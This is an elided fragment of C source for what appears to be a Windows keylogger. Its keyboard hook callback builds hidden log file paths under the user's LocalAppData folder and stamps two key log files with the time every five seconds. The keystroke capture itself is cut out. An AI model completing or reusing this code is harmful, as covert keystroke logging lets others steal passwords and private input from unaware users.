...
LRESULT CALLBACK fnKeyboardCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    ...
    strcat(szQKlogFilePath, chpLocalAppdataPath);

    strcat(szQKlogFilePath, "\\");
    strcat(szQKlogFilePath, MAIN_DIR);
    strcat(szQKlogFilePath, "\\");
    strcat(szQKlogFilePath, REC_DIR);
    strcat(szQKlogFilePath, "\\");
    strcat(szQKlogFilePath, KEY_DIR);
    strcat(szQKlogFilePath, "\\");

    /* KEY_DIR is common dir for Q & F. */
    strcat(szFKlogFilePath, szQKlogFilePath);

    strcat(szQKlogFilePath, QKLOG_FILE);
    strcat(szFKlogFilePath, FKLOG_FILE);
    ...
    //char val[5];
    //DWORD dwMsg = 1; /* Contains the scan code and extended flag */
    ...
    /*************************************************************************/
    /* Gets, checks and sets datetime. */

    int iIsStillInSameSecond = 1;
    ...
    /* Every 5 sec. */
    if((iSeconds % 5 == 0) && (iSeconds != iIsStillInSameSecond))
    {
        iIsStillInSameSecond = iSeconds;

        strftime(szTimeBuffer, 51, "\n[%Y/%m/%d %H:%M:%S] ==> ", SpLocalTime);

        fputs(szTimeBuffer, pTQLogFile);
        fputs(szTimeBuffer, pTFLogFile);
    }
